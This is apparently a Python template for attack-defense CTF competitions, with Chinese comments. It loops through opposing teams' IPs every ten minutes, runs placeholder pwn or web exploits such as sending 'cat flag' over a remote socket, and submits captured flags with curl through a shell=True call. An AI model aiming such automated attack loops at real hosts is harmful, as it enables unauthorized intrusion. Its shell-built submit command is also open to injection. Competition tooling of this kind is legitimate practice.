#coding=utf-8
import time
import re
import subprocess
# pwn题
# from pwn import *
# web题
# import requests


############################################################
###################### READ ME FIREST ######################
############################################################
#需要修改的内容：
#1、main函数中的ip、port、token配置
#2、attack函数中payload内容
#3、submit函数中curl链接及格式
#需要注意的事项：
#1、attack中的remote或request必须设置timeout
#2、接受flag前一定要把其他回显接收完
#3、正式运行时将debug关闭，减少回显

def attack(ip,port):
    try:
        ################## pwn exploit demo ################
        # r = remote(ip,port,timeout=10)
        # # ........payload.......
        # # r.interactive()
        # # 将interactive()更改为cat flag或其他命令
        # r.sendline("cat flag")
        # # 接受flag前一定要把其他回显接受完
        # flag = r.recvline().strip()
        # r.close()


        ################## web exploit demo ################
        # ret = requests.post("http://"+ip+":"+port+"/target/index.php", json = submit_data, headers=headers,timeout = 10)
        # # ........payload.......
        # # 正则匹配flag
        # flag = re.search(r'flag\{.+\}', r.text).group()

        print("[\033[0;36mFLAGS\033[0m] "+ip+":"+port +"\033[0m flag is : \033[0;36m"+flag +"\033[0m")

        print("[\033[0;32mSUCCE\033[0m] "+ip+":"+port +" attack success")
        return flag

    except Exception as e:
        print("[\033[0;37;41mERROR\033[0m] \033[0;32m"+ip+"\033[0m:\033[0;34m"+port +"\033[0m can not attack, because: \033[0;31m" + str(e) + "\033[0m")
        return False

def submit(ip,port,flag):
    try:
        # 修改submit的格式
        a = subprocess.Popen(['curl -s http://10.10.10.1/submit_flag -d "flag={flag}&token=askfjklasu12388jlj"'.format(flag=flag)],shell=True, stdout=subprocess.PIPE)
        # print(a.stdout.readline())
        print("[\033[0;32mSUCCE\033[0m] "+ip+":"+port + " submit success")
    except Exception as e:
        print("[\033[0;37;41mERROR\033[0m] \033[0;32m"+ip+"\033[0m:\033[0;34m"+port + "\033[0m submit failed, because: \033[0;31m" + str(e) + "\033[0m")
        return False

def main():
    # 一轮中所有队伍
    for i in range(101,124):
        self_id = 103 # 跳过自己的队伍ip
        if i == self_id:
            continue
        # 修改ip地址格式
        ip = "192.168."+str(i)+".101"
        # ip = "172.16.100."+str(i)
        # 修改题目端口
        port = "9999"
        flag = attack(ip,port)
        submit(ip,port,flag)
        time.sleep(1)
    print("[\033[0;30;43mROUND\033[0m] "+time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())+" round attack end, waitting for next round")

if __name__ == '__main__':
    while 1:
        # 每个轮次
        print("[\033[0;30;43mROUND\033[0m] "+time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())+" begin to attack")
        main()
        time.sleep(10*60)
